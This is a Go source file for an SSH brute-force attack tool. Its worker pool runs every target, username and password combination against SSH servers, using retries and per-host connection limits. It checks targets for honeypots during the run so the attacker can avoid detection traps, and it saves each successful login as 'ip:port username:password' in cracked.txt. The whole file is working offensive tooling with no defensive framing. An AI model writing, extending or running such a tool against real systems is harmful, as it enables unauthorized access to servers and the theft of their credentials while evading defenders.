package main

import (
	"context"
	"fmt"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

// WorkerPool manages concurrent SSH brute force workers
type WorkerPool struct {
	workers    int
	jobQueue   chan Job
	resultChan chan Result
	ctx        context.Context
	cancel     context.CancelFunc
	wg         sync.WaitGroup
	mu         sync.Mutex
	results    []Result
	detector   *HoneypotDetector

	// Progress tracking
	totalJobs     int
	completedJobs int
	successCount  int
	startTime     time.Time

	// Honeypot monitoring
	monitoredTargets      []string
	honeypotCheckInterval time.Duration
	lastHoneypotCheck     time.Time

	// Connection limiting and failed IP caching
	limits         ConnectionLimits
	failedIPs      map[string]*FailedIPInfo
	failedIPsMutex sync.RWMutex
	connSemaphores map[string]chan struct{} // Per-target connection limiters
	connSemMutex   sync.Mutex
}

// NewWorkerPool creates a new worker pool
func NewWorkerPool(workers int, limits ConnectionLimits) *WorkerPool {
	ctx, cancel := context.WithCancel(context.Background())

	return &WorkerPool{
		workers:               workers,
		jobQueue:              make(chan Job, workers*2), // Buffer for better performance
		resultChan:            make(chan Result, workers*2),
		ctx:                   ctx,
		cancel:                cancel,
		results:               make([]Result, 0),
		detector:              NewHoneypotDetector(),
		startTime:             time.Now(),
		honeypotCheckInterval: 30 * time.Second, // Check every 30 seconds
		lastHoneypotCheck:     time.Now(),
		limits:                limits,
		failedIPs:             make(map[string]*FailedIPInfo),
		connSemaphores:        make(map[string]chan struct{}),
	}
}

// Close shuts down the worker pool and triggers garbage collection
func (wp *WorkerPool) Close() {
	close(wp.jobQueue)
	wp.cancel()
	wp.wg.Wait()
	close(wp.resultChan)

	// Force garbage collection
	runtime.GC()
	runtime.GC() // Call twice for better cleanup
}

// StartWorkers starts the worker goroutines
func (wp *WorkerPool) StartWorkers() {
	for i := 0; i < wp.workers; i++ {
		wp.wg.Add(1)
		go wp.worker(i)
	}
}

// worker processes jobs from the queue
func (wp *WorkerPool) worker(id int) {
	defer wp.wg.Done()

	for {
		select {
		case job, ok := <-wp.jobQueue:
			if !ok {
				return // Channel closed
			}

			// Check if IP has failed too many times
			if wp.isIPFailed(job.Target) {
				// Skip this job, record as failed
				result := Result{
					Job:     job,
					Success: false,
					Error:   fmt.Errorf("IP %s has failed too many times", job.Target),
				}
				select {
				case wp.resultChan <- result:
				case <-wp.ctx.Done():
					return
				}
				continue
			}

			// Try to acquire connection slot
			if !wp.acquireConnection(job.Target) {
				// No available connection slots, skip this job
				result := Result{
					Job:     job,
					Success: false,
					Error:   fmt.Errorf("no available connection slots for %s", job.Target),
				}
				select {
				case wp.resultChan <- result:
				case <-wp.ctx.Done():
					return
				}
				continue
			}

			// Process the job with retry logic
			success, err := wp.trySSHLoginWithRetry(job)

			// Release connection slot
			wp.releaseConnection(job.Target)

			// Record failed attempts
			if !success && err != nil {
				wp.recordFailedIP(job.Target, err.Error())
			}

			result := Result{
				Job:     job,
				Success: success,
				Error:   err,
			}

			// Send result
			select {
			case wp.resultChan <- result:
			case <-wp.ctx.Done():
				return
			}

		case <-wp.ctx.Done():
			return
		}
	}
}

// BruteForceSSH starts the brute force process with worker pool
func (wp *WorkerPool) BruteForceSSH(targets, users, passwords []string) {
	// Store targets for interval checking
	wp.monitoredTargets = targets

	// Start workers
	wp.StartWorkers()

	// Start result collector
	go wp.collectResults()

	// Start interval honeypot checker (only if honeypot detection is enabled)
	// This will be controlled by the main function

	// Generate and queue jobs
	totalJobs := 0
	for _, target := range targets {
		// Parse target for host:port
		addr := target
		port := "22"
		if strings.Contains(target, ":") {
			parts := strings.Split(target, ":")
			addr = parts[0]
			port = parts[1]
		}

		for _, user := range users {
			for _, pass := range passwords {
				job := Job{
					Target:   fmt.Sprintf("%s:%s", addr, port),
					Username: user,
					Password: pass,
				}

				select {
				case wp.jobQueue <- job:
					totalJobs++
				case <-wp.ctx.Done():
					return
				}
			}
		}
	}

	wp.totalJobs = totalJobs
	fmt.Printf("Queued %d jobs for processing...\n", totalJobs)

	// Start progress updater
	go wp.updateProgress()

	// Wait for all jobs to complete
	wp.wg.Wait()

	// Print final results
	wp.printResults()
}

// collectResults collects and stores results
func (wp *WorkerPool) collectResults() {
	for result := range wp.resultChan {
		wp.mu.Lock()
		wp.results = append(wp.results, result)
		wp.completedJobs++
		if result.Success {
			wp.successCount++
		}
		wp.mu.Unlock()

		// Log every host attempt
		fmt.Printf("Attempting: %s@%s with password '%s'\n",
			result.Job.Username, result.Job.Target, result.Job.Password)

		// Print success immediately (these are important)
		if result.Success {
			fmt.Printf("SUCCESS: %s:%s@%s\n", result.Job.Username, result.Job.Password, result.Job.Target)
			// Export successful login to cracked.txt
			wp.exportCrackedHost(result.Job)
		}
	}
}

// updateProgress updates the progress line in real-time
func (wp *WorkerPool) updateProgress() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			wp.mu.Lock()
			completed := wp.completedJobs
			success := wp.successCount
			total := wp.totalJobs
			wp.mu.Unlock()

			if completed < total {
				elapsed := time.Since(wp.startTime)
				rate := float64(completed) / elapsed.Seconds()
				remaining := time.Duration(float64(total-completed)/rate) * time.Second

				// Clear line and print progress
				fmt.Printf("\r\033[KProgress: %d/%d (%.1f%%) | Success: %d | Rate: %.1f/s | ETA: %v",
					completed, total, float64(completed)/float64(total)*100, success, rate, remaining.Round(time.Second))
			}
		case <-wp.ctx.Done():
			return
		}
	}
}

// printResults prints summary of all results
func (wp *WorkerPool) printResults() {
	wp.mu.Lock()
	defer wp.mu.Unlock()

	elapsed := time.Since(wp.startTime)
	rate := float64(wp.completedJobs) / elapsed.Seconds()

	fmt.Printf("\n\n=== SUMMARY ===\n")
	fmt.Printf("Total attempts: %d\n", wp.completedJobs)
	fmt.Printf("Successful logins: %d\n", wp.successCount)
	fmt.Printf("Failed attempts: %d\n", wp.completedJobs-wp.successCount)
	fmt.Printf("Time elapsed: %v\n", elapsed.Round(time.Second))
	fmt.Printf("Average rate: %.1f attempts/second\n", rate)

	// Print export information
	if wp.successCount > 0 {
		fmt.Printf("\n=== EXPORT ===\n")
		fmt.Printf("Successfully cracked hosts exported to: cracked.txt\n")
		fmt.Printf("Format: ip:port username:password\n")
		wp.displayCrackedHosts()
	}

	// Print failed IPs statistics
	wp.printFailedIPsStats()
}

// printFailedIPsStats prints statistics about failed IPs
func (wp *WorkerPool) printFailedIPsStats() {
	wp.failedIPsMutex.RLock()
	defer wp.failedIPsMutex.RUnlock()

	if len(wp.failedIPs) == 0 {
		return
	}

	fmt.Printf("\n=== FAILED IPs STATISTICS ===\n")
	for ip, info := range wp.failedIPs {
		status := "ACTIVE"
		if info.FailCount >= wp.limits.MaxRetries {
			status = "BLOCKED"
		}
		fmt.Printf("IP: %s | Failures: %d/%d | Status: %s | Last Fail: %v\n",
			ip, info.FailCount, wp.limits.MaxRetries, status, info.LastFail.Format("15:04:05"))
	}
}

// CheckHoneypots analyzes targets for honeypot characteristics with concurrent processing
func (wp *WorkerPool) CheckHoneypots(targets []string) map[string]*HoneypotInfo {
	honeypots := make(map[string]*HoneypotInfo)
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Use a semaphore to limit concurrent honeypot checks
	semaphore := make(chan struct{}, 10) // Max 10 concurrent checks

	for _, target := range targets {
		wg.Add(1)
		go func(t string) {
			defer wg.Done()

			// Acquire semaphore
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			info := wp.detector.AnalyzeTarget(t)
			if info.IsHoneypot {
				mu.Lock()
				honeypots[t] = info
				mu.Unlock()
			}
		}(target)
	}

	wg.Wait()
	return honeypots
}

// intervalHoneypotChecker periodically checks for honeypots during brute force
func (wp *WorkerPool) intervalHoneypotChecker() {
	ticker := time.NewTicker(wp.honeypotCheckInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// Check if enough time has passed since last check
			if time.Since(wp.lastHoneypotCheck) >= wp.honeypotCheckInterval {
				wp.mu.Lock()
				wp.lastHoneypotCheck = time.Now()
				wp.mu.Unlock()

				// Perform quick honeypot check on a subset of targets
				go wp.quickHoneypotCheck()
			}
		case <-wp.ctx.Done():
			return
		}
	}
}

// quickHoneypotCheck performs a fast honeypot check on random targets
func (wp *WorkerPool) quickHoneypotCheck() {
	if len(wp.monitoredTargets) == 0 {
		return
	}

	// Check a random subset of targets (max 5)
	checkCount := 5
	if len(wp.monitoredTargets) < checkCount {
		checkCount = len(wp.monitoredTargets)
	}

	// Use a simple round-robin approach to check different targets
	startIndex := int(time.Now().UnixNano()) % len(wp.monitoredTargets)

	for i := 0; i < checkCount; i++ {
		index := (startIndex + i) % len(wp.monitoredTargets)
		target := wp.monitoredTargets[index]

		// Quick check with shorter timeout
		info := wp.detector.AnalyzeTarget(target)
		if info.IsHoneypot {
			fmt.Printf("\nHONEYPOT DETECTED DURING BRUTE FORCE: %s (confidence: %.1f%%)\n",
				target, info.Confidence*100)
		}
	}
}

// EnableIntervalHoneypotChecking enables interval-based honeypot checking
func (wp *WorkerPool) EnableIntervalHoneypotChecking() {
	go wp.intervalHoneypotChecker()
}

// isIPFailed checks if an IP has failed too many times
func (wp *WorkerPool) isIPFailed(target string) bool {
	wp.failedIPsMutex.RLock()
	defer wp.failedIPsMutex.RUnlock()

	info, exists := wp.failedIPs[target]
	if !exists {
		return false
	}

	// Check if IP has failed more than max retries
	return info.FailCount >= wp.limits.MaxRetries
}

// recordFailedIP records a failed attempt for an IP
func (wp *WorkerPool) recordFailedIP(target string, reason string) {
	wp.failedIPsMutex.Lock()
	defer wp.failedIPsMutex.Unlock()

	info, exists := wp.failedIPs[target]
	if !exists {
		info = &FailedIPInfo{
			IP:        target,
			FailCount: 0,
			Reasons:   make([]string, 0),
		}
		wp.failedIPs[target] = info
	}

	info.FailCount++
	info.LastFail = time.Now()
	info.Reasons = append(info.Reasons, reason)
}

// getConnectionSemaphore gets or creates a semaphore for a target
func (wp *WorkerPool) getConnectionSemaphore(target string) chan struct{} {
	wp.connSemMutex.Lock()
	defer wp.connSemMutex.Unlock()

	sem, exists := wp.connSemaphores[target]
	if !exists {
		sem = make(chan struct{}, wp.limits.MaxConnsPerTarget)
		wp.connSemaphores[target] = sem
	}

	return sem
}

// acquireConnection acquires a connection slot for a target
func (wp *WorkerPool) acquireConnection(target string) bool {
	sem := wp.getConnectionSemaphore(target)

	select {
	case sem <- struct{}{}:
		return true
	case <-wp.ctx.Done():
		return false
	default:
		return false // No available connection slots
	}
}

// releaseConnection releases a connection slot for a target
func (wp *WorkerPool) releaseConnection(target string) {
	sem := wp.getConnectionSemaphore(target)
	select {
	case <-sem:
	default:
		// Semaphore was already empty, shouldn't happen
	}
}

// exportCrackedHost exports a successfully cracked host to cracked.txt
func (wp *WorkerPool) exportCrackedHost(job Job) {
	// Format: ip:port username:password
	crackedEntry := fmt.Sprintf("%s %s:%s\n", job.Target, job.Username, job.Password)

	// Open file in append mode
	file, err := os.OpenFile("cracked.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error opening cracked.txt: %v\n", err)
		return
	}
	defer file.Close()

	// Write the entry
	if _, err := file.WriteString(crackedEntry); err != nil {
		fmt.Printf("Error writing to cracked.txt: %v\n", err)
		return
	}

	// Flush to ensure immediate write
	file.Sync()

	fmt.Printf("Exported to cracked.txt: %s %s:%s\n", job.Target, job.Username, job.Password)
}

// trySSHLoginWithRetry attempts SSH login with retry logic
func (wp *WorkerPool) trySSHLoginWithRetry(job Job) (bool, error) {
	var lastErr error

	for attempt := 1; attempt <= wp.limits.MaxRetries; attempt++ {
		success, err := wp.trySSHLogin(job)

		if success {
			return true, nil
		}

		lastErr = err

		// If this is not the last attempt, wait before retrying
		if attempt < wp.limits.MaxRetries {
			// Check if we should continue (context not cancelled)
			select {
			case <-wp.ctx.Done():
				return false, fmt.Errorf("context cancelled")
			case <-time.After(wp.limits.RetryDelay):
				// Continue to next attempt
			}
		}
	}

	return false, fmt.Errorf("failed after %d attempts: %v", wp.limits.MaxRetries, lastErr)
}

// displayCrackedHosts displays the contents of cracked.txt
func (wp *WorkerPool) displayCrackedHosts() {
	file, err := os.Open("cracked.txt")
	if err != nil {
		fmt.Printf("Error reading cracked.txt: %v\n", err)
		return
	}
	defer file.Close()

	// Read file contents
	content, err := os.ReadFile("cracked.txt")
	if err != nil {
		fmt.Printf("Error reading cracked.txt: %v\n", err)
		return
	}

	if len(content) == 0 {
		fmt.Printf("No cracked hosts found in cracked.txt\n")
		return
	}

	fmt.Printf("\nCracked hosts:\n")
	fmt.Printf("%s", string(content))
}
